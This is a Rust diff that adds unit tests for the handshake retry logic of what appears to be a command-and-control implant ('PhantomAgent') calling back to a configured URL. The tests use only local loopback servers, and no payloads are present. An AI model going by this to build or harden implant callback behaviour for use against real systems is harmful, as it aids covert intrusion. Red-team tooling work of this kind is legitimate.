@@ -213,3 +213,214 @@ fn unpack_working_hours_time(working_hours: u32, hour_shift: u32, minute_shift: 
     let minute = ((working_hours >> minute_shift) & 0b11_1111) as u8;
     Time::from_hms(hour.min(23), minute.min(59), 0).unwrap_or(Time::MIDNIGHT)
 }
+
+#[cfg(test)]
+mod tests {
+    use std::error::Error;
+    use std::io::{Read, Write};
+    use std::net::TcpListener;
+    use std::sync::atomic::{AtomicUsize, Ordering};
+    use std::sync::{Arc, mpsc};
+    use std::thread;
+
+    use red_cell_common::crypto::encrypt_agent_data;
+
+    use super::super::PhantomAgent;
+    use crate::config::PhantomConfig;
+    use crate::error::PhantomError;
+
+    fn read_http_request(
+        stream: &mut std::net::TcpStream,
+    ) -> Result<Vec<u8>, Box<dyn Error + Send + Sync>> {
+        let mut request = Vec::new();
+        let mut buffer = [0_u8; 4096];
+        let mut header_end = None;
+        let mut content_length = 0_usize;
+
+        loop {
+            let n = stream.read(&mut buffer)?;
+            if n == 0 {
+                break;
+            }
+            request.extend_from_slice(&buffer[..n]);
+
+            if header_end.is_none() {
+                header_end = request
+                    .windows(4)
+                    .position(|window| window == b"\r\n\r\n")
+                    .map(|index| index + 4);
+                if let Some(end) = header_end {
+                    let headers = std::str::from_utf8(&request[..end])?;
+                    content_length = headers
+                        .lines()
+                        .find_map(|line| {
+                            let (name, value) = line.split_once(':')?;
+                            name.eq_ignore_ascii_case("content-length").then_some(value.trim())
+                        })
+                        .unwrap_or("0")
+                        .parse::<usize>()?;
+                }
+            }
+
+            if let Some(end) = header_end
+                && request.len() >= end + content_length
+            {
+                break;
+            }
+        }
+
+        Ok(header_end.map_or_else(Vec::new, |end| request[end..].to_vec()))
+    }
+
+    fn write_http_response(
+        stream: &mut std::net::TcpStream,
+        body: &[u8],
+    ) -> Result<(), Box<dyn Error + Send + Sync>> {
+        stream.write_all(
+            format!(
+                "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
+                body.len()
+            )
+            .as_bytes(),
+        )?;
+        stream.write_all(body)?;
+        Ok(())
+    }
+
+    fn valid_ack(agent: &PhantomAgent) -> Result<Vec<u8>, Box<dyn Error + Send + Sync>> {
+        Ok(encrypt_agent_data(
+            &agent.session_crypto.key,
+            &agent.session_crypto.iv,
+            &agent.agent_id.to_le_bytes(),
+        )?)
+    }
+
+    /// init_handshake_with_retry returns Ok(()) without sleeping when the first attempt succeeds.
+    #[tokio::test(start_paused = true)]
+    async fn retry_succeeds_on_first_attempt() -> Result<(), Box<dyn Error + Send + Sync>> {
+        let listener = TcpListener::bind(("127.0.0.1", 0))?;
+        let address = listener.local_addr()?;
+        let (response_tx, response_rx) = mpsc::channel::<Vec<u8>>();
+
+        let server = thread::spawn(move || -> Result<(), Box<dyn Error + Send + Sync>> {
+            let (mut stream, _) = listener.accept()?;
+            let _body = read_http_request(&mut stream)?;
+            write_http_response(&mut stream, &response_rx.recv()?)?;
+            Ok(())
+        });
+
+        let config = PhantomConfig {
+            callback_url: format!("http://{address}/"),
+            sleep_delay_ms: 0,
+            ..PhantomConfig::default()
+        };
+        let mut agent = PhantomAgent::new(config)?;
+        response_tx.send(valid_ack(&agent)?)?;
+
+        agent.init_handshake_with_retry().await?;
+
+        assert_eq!(agent.ctr_offset, 1);
+        server.join().map_err(|_| "server thread panicked")??;
+        Ok(())
+    }
+
+    /// A Transport error on attempt 1 is retried; success on attempt 2 returns Ok(()).
+    #[tokio::test(start_paused = true)]
+    async fn retry_succeeds_after_one_transport_failure() -> Result<(), Box<dyn Error + Send + Sync>>
+    {
+        let listener = TcpListener::bind(("127.0.0.1", 0))?;
+        let address = listener.local_addr()?;
+        let (response_tx, response_rx) = mpsc::channel::<Vec<u8>>();
+
+        let server = thread::spawn(move || -> Result<(), Box<dyn Error + Send + Sync>> {
+            // Accept and immediately drop the first connection → client gets connection-reset.
+            let _ = listener.accept()?;
+            // Accept the second connection and serve a valid acknowledgement.
+            let (mut stream, _) = listener.accept()?;
+            let _body = read_http_request(&mut stream)?;
+            write_http_response(&mut stream, &response_rx.recv()?)?;
+            Ok(())
+        });
+
+        let config = PhantomConfig {
+            callback_url: format!("http://{address}/"),
+            sleep_delay_ms: 0,
+            ..PhantomConfig::default()
+        };
+        let mut agent = PhantomAgent::new(config)?;
+        response_tx.send(valid_ack(&agent)?)?;
+
+        // The 2-second retry delay is instant because time is paused.
+        agent.init_handshake_with_retry().await?;
+
+        assert_eq!(agent.ctr_offset, 1);
+        server.join().map_err(|_| "server thread panicked")??;
+        Ok(())
+    }
+
+    /// Transport errors on all 3 attempts exhaust the retry budget and return Err(Transport).
+    #[tokio::test(start_paused = true)]
+    async fn retry_exhausts_all_attempts_with_transport_error()
+    -> Result<(), Box<dyn Error + Send + Sync>> {
+        // Bind a port to get an ephemeral address, then drop the listener so the port
+        // is closed before the agent connects → every attempt gets "connection refused".
+        let address = {
+            let listener = TcpListener::bind(("127.0.0.1", 0))?;
+            listener.local_addr()?
+        };
+
+        let config = PhantomConfig {
+            callback_url: format!("http://{address}/"),
+            sleep_delay_ms: 0,
+            ..PhantomConfig::default()
+        };
+        let mut agent = PhantomAgent::new(config)?;
+
+        let result = agent.init_handshake_with_retry().await;
+        assert!(
+            matches!(result, Err(PhantomError::Transport(_))),
+            "expected Transport error after exhausting retries, got {result:?}"
+        );
+        Ok(())
+    }
+
+    /// A non-Transport error (e.g. crypto mismatch) is propagated immediately without retry.
+    #[tokio::test(start_paused = true)]
+    async fn retry_does_not_retry_non_transport_error() -> Result<(), Box<dyn Error + Send + Sync>>
+    {
+        let connection_count = Arc::new(AtomicUsize::new(0));
+        let counter_clone = Arc::clone(&connection_count);
+
+        let listener = TcpListener::bind(("127.0.0.1", 0))?;
+        let address = listener.local_addr()?;
+
+        let server = thread::spawn(move || -> Result<(), Box<dyn Error + Send + Sync>> {
+            let (mut stream, _) = listener.accept()?;
+            counter_clone.fetch_add(1, Ordering::SeqCst);
+            let _body = read_http_request(&mut stream)?;
+            // Garbage body → parse_init_ack returns Crypto or InvalidResponse, not Transport.
+            write_http_response(&mut stream, b"not-a-valid-ack")?;
+            Ok(())
+        });
+
+        let config = PhantomConfig {
+            callback_url: format!("http://{address}/"),
+            sleep_delay_ms: 0,
+            ..PhantomConfig::default()
+        };
+        let mut agent = PhantomAgent::new(config)?;
+
+        let result = agent.init_handshake_with_retry().await;
+
+        assert!(result.is_err(), "expected an error, got Ok");
+        assert!(
+            !matches!(result, Err(PhantomError::Transport(_))),
+            "non-Transport errors must not be retried; got Transport"
+        );
+        // Exactly one connection → no retry happened.
+        assert_eq!(connection_count.load(Ordering::SeqCst), 1);
+
+        server.join().map_err(|_| "server thread panicked")??;
+        Ok(())
+    }
+}
